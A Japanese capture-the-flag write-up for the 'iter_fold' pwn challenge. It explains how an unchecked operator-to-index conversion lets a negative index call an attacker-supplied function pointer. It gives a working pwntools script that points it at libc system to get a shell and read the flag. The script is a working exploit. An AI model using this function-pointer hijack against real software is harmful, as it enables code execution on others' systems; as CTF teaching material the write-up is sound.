# iter_fold writeup

## 問題文

```txt
トゥットゥルー♪まゆしぃ☆です。

`nc 203.0.113.0 4004`
```

## about

Rustの`iter().fold()`の様な挙動を再現するプログラムです．

関数ポインタ経由の呼び出しと，C言語における配列のインデックスアクセスが糖衣構文である事を利用します．

また，libcのベースアドレスが提示されているので活用します．

## writeup

```c
typedef long (*operation)(long*, long);

struct Fold {
    long array[5];
    operation ops[6];
};
```

こんな構造体があり，

```c
long fold(long* array, long* init, operation op) {
    for (int i = 0; i < 5; i++)
        op(init, array[i])

    return *init;
}
```

に渡される．

`main`では,

```c
struct Fold f = {
    .array = {0, 0, 0, 0, 0},
    .ops[0] = multiplication,
    .ops[1] = add,
    .ops[3] = sub,
    .ops[5] = division,
};
```

の様に変数が宣言されています，`add`や`sub`は名前に準じた操作を行う関数です．

`f.array`の各要素を`scanf("%ld", &f.array[i])`で読み込んだ後，初期値，演算子を読んでいます．

しかし，演算子の扱いが問題です．

```c
scanf("%c", &op);
```

で`op`に読んだ後，

```c
fold(f.array, &init, f.ops[op_to_index(op)]);
```

の様な呼び出しをしています．

`op_to_index`はシンプルで，

```c
int op_to_index(char op) {
    return op - '*';
}
```

これは，想定されている演算子`('+', '-', '*', '/')`の中では正常に機能しますが，それ以外の文字が入力された場合に脆弱です．

C言語において，配列への添字によるアクセスは糖衣構文です．

```c
ops[i] == *(ops + i)
```

つまり，添字の値が負であった場合も動作します．

ここで，メモリ上の`Fold`の配置を確認すると

```c
f.array[4] == f.ops[-1]
```

である事がわかります．

`f.array[4]`に任意のアドレスを入れれば，それを呼び出せる訳です．

```python3

m pwn import *

binfile = '../distfiles/chall'
e = ELF(binfile)
context.binary = binfile
libc = ELF('../distfiles/libc-2.27.so')

io = remote('203.0.113.0', 4004)

system_offset = libc.sym['system']
sh_byte = 0x6873

# 0x7f3965438000 < トゥットゥルー♪ libcです☆
libc_base_addr = int(io.recvline().split()[0], 16)

system_addr = libc_base_addr + system_offset

array = [0] * 4 + [system_addr]

for i in array:
    # array[{{index}}] =
    io.sendlineafter('=', str(i))

# init =
io.sendlineafter('=', str(sh_byte))

# operator please(+,-,*,/)
io.readline()

# op = '*' - 1
io.sendline(chr(ord('*') - 1))

# vec![{{array}}].iter().fold({{init}}, |ans, &x| ans {{op}} x);
io.readline()

io.sendline('cat flag.txt')
print(io.readline().decode())
```

## flag

`ISCCTF{m4g1c4l_p0w3rfull_libc_offset}`
